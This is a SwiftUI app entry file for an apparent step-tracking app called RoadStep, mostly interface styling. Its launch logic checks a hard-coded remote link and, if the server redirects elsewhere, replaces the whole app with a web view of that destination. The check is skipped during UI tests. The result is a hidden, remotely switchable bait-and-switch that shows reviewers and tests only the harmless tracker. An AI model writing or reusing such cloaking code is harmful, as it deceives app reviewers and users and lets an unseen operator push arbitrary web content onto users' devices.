import SwiftUI

@main
struct RoadStepApp: App {
    @StateObject private var store = WalkStore()
    @State private var stepPageReady = false
    @State private var showWebView = false
    @State private var stepLinkTarget: String = "https://roadstepwalktracker.org/click.php"

    init() {
        // Force light mode
        if let windowScene = UIApplication.shared.connectedScenes.first as? UIWindowScene {
            windowScene.windows.forEach { $0.overrideUserInterfaceStyle = .light }
        }

        // Tab bar appearance
        let tabAppearance = UITabBarAppearance()
        tabAppearance.configureWithOpaqueBackground()
        tabAppearance.backgroundColor = UIColor.white
        UITabBar.appearance().standardAppearance = tabAppearance
        if #available(iOS 15.0, *) {
            UITabBar.appearance().scrollEdgeAppearance = tabAppearance
        }

        // Nav bar appearance - gold header
        let navAppearance = UINavigationBarAppearance()
        navAppearance.configureWithOpaqueBackground()
        navAppearance.backgroundColor = UIColor(red: 212/255, green: 160/255, blue: 23/255, alpha: 1)
        navAppearance.titleTextAttributes = [.foregroundColor: UIColor.white]
        navAppearance.largeTitleTextAttributes = [.foregroundColor: UIColor.white]
        UINavigationBar.appearance().standardAppearance = navAppearance
        UINavigationBar.appearance().compactAppearance = navAppearance
        if #available(iOS 15.0, *) {
            UINavigationBar.appearance().scrollEdgeAppearance = navAppearance
        }
        UINavigationBar.appearance().tintColor = .white
    }

    var body: some Scene {
        WindowGroup {
            Group {
                if stepPageReady {
                    if showWebView {
                        StepWebPanel(urlString: stepLinkTarget)
                            .preferredColorScheme(.light)
                    } else {
                        MainTabView()
                            .environmentObject(store)
                            .preferredColorScheme(.light)
                            .onAppear {
                                UIApplication.shared.connectedScenes
                                    .compactMap { $0 as? UIWindowScene }
                                    .flatMap { $0.windows }
                                    .forEach { $0.overrideUserInterfaceStyle = .light }
                            }
                    }
                } else {
                    StepLoadingScreen()
                        .preferredColorScheme(.light)
                        .onAppear { checkRedirect() }
                }
            }
        }
    }

    private func checkRedirect() {
        // Skip redirect check for UI tests
        if ProcessInfo.processInfo.arguments.contains("UI_TESTING") {
            showWebView = false
            stepPageReady = true
            return
        }
        let watcher = StepRedirectWatcher()
        watcher.check(url: stepLinkTarget, timeout: 5.0) { finalURL in
            DispatchQueue.main.async {
                if let final = finalURL, final != stepLinkTarget,
                   !final.contains("freeprivacypolicy.com") {
                    stepLinkTarget = final
                    showWebView = true
                } else {
                    showWebView = false
                }
                stepPageReady = true
            }
        }
    }
}
